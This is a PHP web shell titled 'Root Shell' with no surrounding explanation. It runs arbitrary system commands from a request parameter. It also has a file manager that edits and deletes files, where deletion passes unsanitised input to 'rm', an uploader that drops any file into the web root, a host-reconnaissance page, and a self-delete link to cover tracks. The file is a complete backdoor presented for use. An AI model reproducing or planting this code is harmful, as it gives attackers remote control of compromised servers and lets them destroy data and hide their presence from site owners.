<?php
if (!empty($_POST['cmd'])) {
    $cmd = shell_exec($_POST['cmd']);
}
?>
<!DOCTYPE>
<html>
  <head>
    <title> Root Shell </title>
<link rel="shortcut icon" type="image/jpg" href="https://i.ibb.co/FVm9QT4/logo.png"/>
</head>
<center>
  <img src="https://i.ibb.co/FVm9QT4/logo.png" height="550px" alt="logo">
<br>
</center>
<center>
<a id = "btns" href = "?fi">File Manager</a>
<a id = "btns" href = "?upl">Uploader</a>
<a id = "btns" href = "?in">Information</a>
<a id = "btns" href = "?die">Delete Me</a>
</center>
<form method="post">
  <input type="text" name="cmd" id="exec" value="<?= $_POST['cmd']?>"
   <input type="submit" value="Execute">
</form>
</button>
</center>
</form>
</html>
<style>
#btns{
  background-color: #6aa5d9;
  padding: 16px;
}
a {
    text-decoration:none;
    color: black;
    padding: 8px 16px;
    font-family: sans-serif;
    border-radius: 3px;
    font-weight:bold;
  }
  .url{
  background-color: #000000;
  color: white;
  display: block;
  padding: 15px 30px;
  display: block;
  cursor: pointer;
  margin-left: 370px;
  border-radius: 10px;
  transition: 0.25s;
  }
  
  a:hover {
    background-color: #029e74;
  }
#_upl{
  text-decoration: none;
  color: white;
  font-size: 13px;
  text-transform: uppercase;
  display: block;
  border:0;
  background: black;
  margin: 20px auto;
  text-align: center;
  border: 2px solid white; 
  padding: 14px 40px;
  outline: none;
  color: white;
  border-radius: 24px;
  transition: 0.25s;
  cursor: pointer;
}
#fname{
  text-decoration: none;
  color: white;
  font-size: 13px;
  display: block;
}
     #exec{
      height: 30;
      width: 80;
      border: white;
    }
    input{
      font-family: monospace;
      height: 60px;
      width: 230px;
      margin: auto;
      border: none;
      align-self: center;
    }
    p{
      font-size: 14px;
      font-family: monospace;
    }
    #area{
      border-radius: 10px;
      padding: 30p;
      background-color: #6aa5d9;
    }
        main {
            margin: auto;
            max-width: 800px;
        }

        pre{
            border-radius: 10px;
        }

        pre{
            background-color: #e1eef0;
        }
        label {
            display: block;
        }
        pre{
            padding: 20px;
        }
        .textarea{
  border: solid ;
  border-block-color: green;
  display: block;
  height: 450px;
  width: 960px;
}
#btn{
  background-color: #6aa5d9;
  padding: 16px;
  text-decoration:none;
  color: black;
  padding: 8px 16px;
  font-family: sans-serif;
  border-radius: 40px;
  font-weight:bold;
}
</style>
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre><b><p>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo '</pre></p>';
        die;
}
?>
<?php
if (isset($_GET['fi'])){
function edit_del(){
  $dir = "./";
  $a = scandir($dir);
  $str = '<table><tr><th></th><th></th></tr>';
  foreach ($a as $val){
    if($val=="." || $val==".." || $val=="..."){
      continue;
    }
    $str .= "<tr><td><p id = 'fname'>$val</p><td><a class = 'url' href= ?del=$val>Delete</a><a class = 'url' href= ?edit=$val>Edit</a></td></tr>";
  }
  $str .= "</table>";
  echo '<pre id = "area"><p>'.$str.'</p></pre>';
  if (isset($_GET['edit'])){
    $file = $_GET['edit'];
    $data = file_get_contents( $file);
    echo "<form method='post'>
    <textarea class='textarea' name = 'tekst' wrap='off'> $data </textarea><br>
    <center><input type='submit' id = 'btn' name='submit' value='Update text'></center>
    <input type='hidden' name='submit_check' value='1'>
    </form>";
    }
    if ($_POST["submit_check"]){
      $file = $_GET['edit'];
      $fp = fopen($file, "w");
      $data = $_POST["tekst"];
      fwrite($fp, $data);
      fclose($fp);
      die("<script>alert('Updated Successfully');</script>");
     };
     if (isset($_GET['del']))
     {
       system("rm ".$_GET['del']);
       die("<script>alert('Deleted Successfully!')</script>");
       }
}
edit_del();
}
?>
<?php
if (isset($_GET['upl'])){
  echo '<form method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<center><input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="UP"></center></form>';
if( $_POST['_upl'] == "UP" ) {
  if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { 
  echo '<p><center>'.$_FILES['file']['name'].' Uploaded Successfully</center><br><center><a href="/'.$_FILES['file']['name'].'">Click me</a>';}
  else { 
     echo '<center><p>'.$_FILES['file']['name'].' Not Uploaded Successfully</center>'; 
}
}
}
?>
<?php
if (isset($_GET['in'])){
  echo "[ x ] Operating System ".PHP_OS."<br>";
  echo "[ x ] PHP Version ".PHP_VERSION."<br>";
  echo "[ x ] IP Address ".$_SERVER['REMOTE_ADDR'];
  echo '<br>';
  echo "[ x ] Headers ".php_uname();
  echo "<br>";
  echo "[ x ] Browser ".$_SERVER['HTTP_USER_AGENT'];
  echo "<br>";
  echo "[ x ] Server Software ". $_SERVER['SERVER_SOFTWARE'];
  echo "<br>";
  echo "[ x ] Privilege ".@get_current_user();
  echo "<br>";
}
?>
<?php
if (isset($_GET['die'])){
  if(@unlink((__FILE__))) { echo "<center><h1>Logged Out...</h1></center>";
  }else{
    echo "<h1><center>Not Deleted</center></h1>";
  }
}
?>